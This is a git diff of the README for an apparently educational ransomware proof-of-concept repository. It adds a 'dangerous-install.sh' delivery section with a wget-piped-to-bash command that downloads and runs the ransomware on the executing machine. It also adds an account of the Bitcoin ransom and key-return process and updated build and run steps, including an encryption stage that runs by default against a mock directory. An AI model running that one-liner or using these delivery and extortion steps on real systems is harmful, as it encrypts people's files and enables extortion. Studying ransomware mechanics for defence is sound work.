@@ -66,10 +66,26 @@ Note that by default, the ransomware looks for a file named `public_key.pem` at 
 ```
 
 ### Installing the Payload on target
-As part of the PoC of delivering a ransomware, we've crafted a shell script `ransomware/scripts/dangerous-installs.sh` to install a released version of the `ransomware` along with a `public_key.pem` on a target system.
+As part of the PoC of delivering a ransomware, we've crafted a shell script `ransomware/scripts/dangerous-install.sh` to install a released version of the `ransomware` along with a `public_key.pem` on a target system. The script can be executed on a remote system with this command:
+```sh
+# WARNING: THIS WILL RUN THE RANSOMWARE ON THE SYSTEM YOU'RE RUNNING THIS COMMAND ON
+wget -q -O - https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/raw/dev/soonann/ransomware/scripts/dangerous-install.sh | bash
+```
+
+### Paying the ransom (decrypting your files)
+After the ransomware has been executed, it creates a key file in the home directory of the user it has executed as.
+In order for the user to decrypt their files, the user will need to make a payment to the given BTC Address with a message attached as mentioned in the ransomware's UI.
+
+The address is an anonymous Bitcoin Address for the attacker to receive payments on, while the message is the encrypted form of the symmetric key that was used to encrypt the files.
+
+### Attacker responds with the decryption key
+Given the encrypted symmetric key from the message attached with the payment, the attacker will then decrypt the message with their private key.
+The attacker would then send this decrypted symmetric key back to the target through other means e.g. anonymous mail, which the target can then use to decrypt their files.
 
 
-#### Encryption
+## Development
+
+### Encryption
 Note that by default, this project will run the ransomware demo against the `os_root` directory in its current directory.
 This can be changed with the flags 
 You can generate an fake `os_root` directory using:
@@ -84,34 +100,25 @@ make mock-gen
 make mock-view
 ```
 
-Before the attack can happen, the attacker will need to generate an RSA key pair:
+We'll now make a copy of the sample attacker's public key located at `attacker/public_key.pem`
 ```sh
-# cd out to the attacker folder
-cd ../attacker
-
-# generate the attacker's keys, or alternatively use the default given keys in the repo
-make attacker-keygen
-
-# to check the keys generated
-ls attacker
-# stdout:
-# ... public_key.pem private_key.pem
+cp attacker/public_key.pem ransomware/public_key.pem
 ```
 
 With the attacker's public key, we can now start the ransomware demo with:
-```s
+```sh
 # to run the demo
 make run
 
 # or you could also build the demo as a binary file and run it
 make build
-./main
+./dist/ransomware
 ```
 
 Running the demo does the following:
 1. Generates a Symmetric Key
-2. Encrypts the Symmetric Key with the attacker's public key (uses `attacker/public-key.pem` by default, can be changed with `--pub` flag) and saves it in the current directory as a file called `key`
-3. Encrypt the files with the Symmetric Key generated in Step 1
+2. Encrypts the Generated Symmetric Key with the attacker's public key (uses `pulic_key.pem` in the same directory by default, can be modified with `--pub` flag) and saves the encrypted content as a file called `key` in the current directory (can be modified with `--enc-sym-key`)
+3. Encrypt the files with the Generated Symmetric Key in Step 1.
 4. Show Ransom UI
 
 After the demo has ran, you are free to close the UI, as you can re-open it with `./main` or `make run` again. This command checks for the `key` file and if it exists, it wouldn't run the encryption again.
@@ -130,5 +137,3 @@ Decrypted contents: n1f6E3RofoXlIeUFP2onpcsi7EcBYd-zgrOG4lNdcdc=
 
 With the key e.g: `n1f6E3RofoXlIeUFP2onpcsi7EcBYd-zgrOG4lNdcdc=`, we would enter this key into the textbox in the GUI and press the decrypt button.
 ![](./docs/demo-decrypt.png)
-
-## Development
